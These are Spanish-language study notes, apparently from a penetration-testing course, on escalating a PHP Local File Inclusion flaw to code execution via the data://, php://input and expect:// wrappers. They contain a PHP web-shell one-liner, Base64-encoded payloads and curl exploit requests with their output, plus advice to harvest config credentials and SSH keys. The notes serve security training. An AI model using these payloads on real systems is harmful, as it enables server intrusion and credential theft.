
## 1. Introducción a los PHP Wrappers

Los **PHP Wrappers** permiten acceder y manipular diferentes flujos de entrada/salida (streams) de PHP. En combinación con una vulnerabilidad **LFI (Local File Inclusion)**, pueden permitir leer archivos locales o, en determinadas condiciones, conseguir **ejecución remota de código (RCE)**.

Antes de intentar conseguir RCE, también conviene investigar si podemos encontrar:

- Credenciales en archivos de configuración, como `config.php`.
    
- Contraseñas reutilizadas entre servicios.
    
- Claves privadas SSH (`id_rsa`) en los directorios `.ssh` de los usuarios.
    
- Otros archivos sensibles accesibles mediante LFI.
    

En esta sección se estudian tres wrappers principales:

|Wrapper|Función|
|---|---|
|`data://`|Permite incluir datos externos, incluido código PHP, bajo determinadas condiciones.|
|`php://input`|Permite acceder al cuerpo de una petición HTTP y utilizarlo como entrada.|
|`expect://`|Permite ejecutar comandos mediante un wrapper externo, si está instalado y habilitado.|

# 2. Wrapper `data://`

El wrapper `data://` permite incluir datos externos, incluido código PHP.

**Requisito principal:** la configuración `allow_url_include` debe estar habilitada en PHP.

## 2.1. Comprobar la configuración de PHP

El archivo de configuración habitual de PHP para Apache puede encontrarse en:

```
/etc/php/X.Y/apache2/php.ini
```

Para PHP-FPM, utilizado habitualmente con Nginx:

```
/etc/php/X.Y/fpm/php.ini
```

Donde `X.Y` representa la versión de PHP instalada.

Podemos intentar leer el archivo de configuración mediante LFI y codificar su contenido en Base64:

```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

La respuesta contendrá una cadena Base64. Podemos decodificarla y buscar la directiva que nos interesa:

```
echo 'CADENA_BASE64' | base64 -d | grep allow_url_include
```

Si encontramos:

```
allow_url_include = On
```

La configuración está habilitada y podemos investigar el uso de `data://`.

**Importante:** si no conocemos la versión de PHP o la ruta exacta, tendremos que investigar cuál corresponde al servidor objetivo.

## 2.2. Conseguir ejecución de código mediante `data://`

Una vez confirmado que la configuración permite utilizar este wrapper, podemos preparar código PHP y codificarlo en Base64.

Ejemplo de código:

```
<?php system($_GET["cmd"]); ?>
```

Para codificarlo:

```
echo -n '<?php system($_GET["cmd"]); ?>' | base64
```

El resultado de la codificación será similar a:

```
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
```

Después, el módulo muestra el uso del wrapper con el formato:

```
data://text/plain;base64,CADENA_BASE64
```

La petición completa del laboratorio es:

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,CADENA_BASE64&cmd=id
```

Al incluir el código PHP, la aplicación puede ejecutar el comando indicado mediante el parámetro `cmd`.

Para probarlo con `curl`:

```
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,CADENA_BASE64&cmd=id'
```

El módulo utiliza el siguiente resultado como ejemplo:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Esto indica que el comando se ejecutó con los privilegios de la cuenta de servicio `www-data`.

### Resumen de `data://`

- Requiere que `allow_url_include` esté habilitado.
    
- Permite incluir datos externos.
    
- Puede utilizarse para incluir código PHP codificado en Base64.
    
- Si el código se ejecuta, los comandos se ejecutan con los privilegios del proceso web.

# 3. Wrapper `php://input`

El wrapper `php://input` permite acceder al cuerpo de una petición HTTP.

A diferencia de `data://`, el código PHP se envía en el cuerpo de una petición POST, en lugar de introducirse directamente en el parámetro vulnerable.

**Requisito:** `allow_url_include` debe estar habilitado.

## 3.1. Ejemplo de explotación

El módulo utiliza el siguiente código PHP:

```
<?php system($_GET["cmd"]); ?>
```

Podemos enviar el código en el cuerpo de una petición POST y utilizar `php://input` como valor del parámetro vulnerable:

```
curl -s -X POST \
  --data '<?php system($_GET["cmd"]); ?>' \
  "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

Si la aplicación procesa correctamente la entrada y ejecuta el código, podemos obtener una salida similar a:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 3.2. Diferencias entre `data://` y `php://input`

|Característica|`data://`|`php://input`|
|---|---|---|
|Origen del código|Datos incluidos en la URL|Cuerpo de la petición HTTP|
|Método mostrado en el módulo|GET|POST|
|Requiere `allow_url_include`|Sí|Sí|
|Codificación Base64|Puede utilizarse|No es necesaria en el ejemplo|
|Ejecución de comandos|Depende de que se ejecute el código incluido|Depende de que se ejecute el código recibido|

### Consideración sobre `GET` y `POST`

En el ejemplo, el código obtiene el comando mediante `$_GET["cmd"]`. Por eso el comando se transmite en la URL, aunque el código PHP se envíe mediante POST.

Si la aplicación solo permite obtener el comando mediante POST, el código tendría que adaptarse para utilizar ese método.

# 4. Wrapper `expect://`

El wrapper `expect://` permite ejecutar comandos directamente mediante un flujo de URL.

A diferencia de los dos wrappers anteriores, está diseñado específicamente para ejecutar comandos, por lo que no necesitamos proporcionar una web shell PHP.

Sin embargo, es un **wrapper externo** y debe estar instalado y habilitado en el servidor.

## 4.1. Comprobar si está configurado

Si podemos leer el archivo `php.ini` mediante LFI, podemos buscar la directiva correspondiente:

```
echo 'CADENA_BASE64' | base64 -d | grep expect
```

Un resultado como el siguiente indica que PHP está configurado para intentar cargar la extensión:

```
extension=expect
```

Esto no garantiza que la extensión funcione correctamente en tiempo de ejecución.

## 4.2. Probar la ejecución de comandos

El módulo muestra el siguiente ejemplo:

```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

Si el wrapper está disponible y la aplicación permite utilizarlo, podemos obtener una salida como:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Resumen de `expect://`

- No necesita una web shell PHP propia.
    
- Está diseñado para ejecutar comandos.
    
- Requiere que la extensión correspondiente esté disponible y habilitada.
    
- La presencia de `extension=expect` en la configuración no garantiza que funcione.

# 5. Comparativa de los tres wrappers

|Característica|`data://`|`php://input`|`expect://`|
|---|---|---|---|
|Finalidad|Incluir datos externos|Acceder al cuerpo de la petición|Ejecutar comandos|
|Código PHP proporcionado por nosotros|Sí, en el ejemplo|Sí, en el ejemplo|No|
|Utiliza el cuerpo POST|No en el ejemplo|Sí|No|
|Requiere `allow_url_include`|Sí|Sí|No es el requisito principal indicado|
|Requiere extensión externa|No es el requisito indicado|No es el requisito indicado|Sí|
|Puede permitir RCE|Sí, si se cumplen las condiciones|Sí, si se cumplen las condiciones|Sí, si está disponible y la aplicación lo permite|

```
echo -n '<?php system($_GET["cmd"]); ?>' | base64
```

```
data://text/plain;base64,CADENA_BASE64
```

### Estructura de `php://input`

```
language=php://input
```

El código PHP se envía en el cuerpo de la petición POST.

### Estructura de `expect://`

```
expect://id
```

### Diferencias que debes recordar

- `**data://**`**:** incluye datos externos y puede utilizar código PHP codificado en Base64.
    
- `**php://input**`**:** utiliza el cuerpo de la petición HTTP como entrada.
    
- `**expect://**`**:** ejecuta comandos directamente si la extensión está disponible.
    
- `**allow_url_include**`**:** es un requisito importante para los ejemplos con `data://` y `php://input`.
    
- `**expect://**`**:** depende de una extensión externa que debe estar instalada y habilitada.
    

**Idea clave:** una LFI no siempre se limita a leer archivos. Dependiendo de los wrappers disponibles, la configuración de PHP y el comportamiento de la función vulnerable, también puede convertirse en una vía de ejecución de código en el servidor.
